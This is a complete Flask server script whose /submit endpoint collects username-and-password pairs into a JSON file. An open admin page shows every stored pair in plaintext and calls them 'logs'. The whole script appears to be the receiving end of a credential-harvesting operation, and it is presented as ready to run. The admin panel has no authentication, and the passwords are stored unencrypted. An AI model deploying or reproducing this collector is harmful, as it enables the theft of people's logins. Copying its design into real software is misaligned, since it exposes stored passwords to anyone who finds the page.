from flask import Flask, request, jsonify, render_template_string, redirect, url_for
import json, os

app = Flask(__name__)
DB = 'used_users.json'

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Panel</title>
    <style>
        body { font-family: Arial, sans-serif; background: #121212; color: #fff; padding: 20px; }
        h1 { color: #90caf9; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 10px; border: 1px solid #444; }
        th { background-color: #1e1e1e; }
        tr:nth-child(even) { background-color: #1a1a1a; }
        form { display: inline; }
        button { background-color: #e57373; border: none; padding: 5px 10px; color: #fff; cursor: pointer; border-radius: 4px; }
        button:hover { background-color: #ef5350; }
    </style>
</head>
<body>
    <h1>🔐 Admin Panel</h1>
    {% if records %}
        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
                {% for r in records %}
                <tr>
                    <td>{{ loop.index }}</td>
                    <td>{{ r.user }}</td>
                    <td>{{ r.password }}</td>
                    <td>
                        <form method="POST" action="/delete/{{ loop.index0 }}">
                            <button type="submit">Delete</button>
                        </form>
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    {% else %}
        <p>Không có log nào.</p>
    {% endif %}
</body>
</html>
'''

@app.route("/")
def home():
    return "✅ Server is running."

@app.route("/submit", methods=["POST"])
def submit():
    data = request.json
    if not isinstance(data, dict) or "user" not in data or "password" not in data:
        return jsonify({"status": "error", "message": "invalid payload"}), 400

    records = []
    if os.path.exists(DB):
        with open(DB, 'r') as f:
            try:
                records = json.load(f)
            except json.JSONDecodeError:
                records = []

    records.append(data)
    with open(DB, 'w') as f:
        json.dump(records, f, indent=2)

    return jsonify({"status": "ok"})

@app.route("/admin", methods=["GET"])
def admin_panel():
    records = []
    if os.path.exists(DB):
        with open(DB, 'r') as f:
            try:
                records = json.load(f)
            except json.JSONDecodeError:
                records = []
    return render_template_string(HTML_TEMPLATE, records=records)

@app.route("/delete/<int:index>", methods=["POST"])
def delete_entry(index):
    if os.path.exists(DB):
        with open(DB, 'r') as f:
            try:
                records = json.load(f)
            except json.JSONDecodeError:
                records = []

        if 0 <= index < len(records):
            records.pop(index)
            with open(DB, 'w') as f:
                json.dump(records, f, indent=2)

    return redirect(url_for('admin_panel'))

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)
